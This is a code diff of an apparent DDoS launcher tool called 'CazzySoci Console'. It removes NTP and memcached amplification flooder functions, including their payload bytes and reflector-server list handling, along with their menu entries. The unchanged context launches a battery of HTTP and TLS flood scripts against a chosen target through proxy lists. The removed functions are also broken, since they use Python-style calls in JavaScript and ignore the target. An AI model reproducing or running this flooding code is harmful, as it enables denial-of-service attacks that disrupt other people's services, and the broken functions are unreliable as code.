@@ -130,59 +130,6 @@ async function bootup() {
   }
 }
 
-const ntp_payload = "\x17\x00\x03\x2a" + "\x00".repeat(4);
-const mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
-
-function NTP(target, port = 80, duration) {
-  try {
-    const ntp_servers = fs.readFileSync('ntpServers.txt', 'utf8').split('\n');
-    const packets = random.randint(10, 150);
-    const server = random.choice(ntp_servers).trim();
-
-    while (time.time() < duration) {
-      try {
-        const packet = Buffer.from(`${ntp_payload}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`);
-        const client = net.createConnection({ port: port, host: server });
-        client.on('connect', () => {
-          for (let i = 0; i < packets; i++) {
-            client.write(packet);
-          }
-          client.end();
-        });
-      } catch (e) {
-        //console.log(`Erro: ${e}`);
-      }
-    }
-  } catch (e) {
-    //console.log(`Erro: ${e}`);
-  }
-}
-
-function MEM(target, port = 443, duration) {
-  try {
-    const memsv = fs.readFileSync('memsv.txt', 'utf8').split('\n');
-    const packets = random.randint(1024, 60000);
-    const server = random.choice(memsv).trim();
-
-    while (time.time() < duration) {
-      try {
-        const packet = Buffer.from(mem_payload);
-        const client = net.createConnection({ port: port, host: server });
-        client.on('connect', () => {
-          for (let i = 0; i < packets; i++) {
-            client.write(packet);
-          }
-          client.end();
-        });
-      } catch (e) {
-        //console.log(`Erro: ${e}`);
-      }
-    }
-  } catch (e) {
-    //console.log(`Erro: ${e}`);
-  }
-}
-
 // [========================================] //
 async function killWifi() {
 const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
@@ -375,8 +322,6 @@ const storm = path.join(__dirname, `/lib/cache/storm.js`);
 const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
 const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
 const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
-const NTP = path.join(__dirname, `NTP`);
-const MEM = path.join(__dirname, `MEM`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -388,7 +333,7 @@ const MEM = path.join(__dirname, `MEM`);
 	exec(`node ${storm} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
-	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${peterda} ${target} ${duration} 50 100 proxy.txt`)
 	  
 	  
           sigma()
@@ -697,8 +642,6 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || destroy    || Kill That Socket
 || flooder    || Powerful Flooder
 || peterda    || Flooder with Advanced Features
-|| NTP        || Ntp Flooder server
-|| MEM        || Mem Flooder server
 [=========================================]
 `);
     sigma();
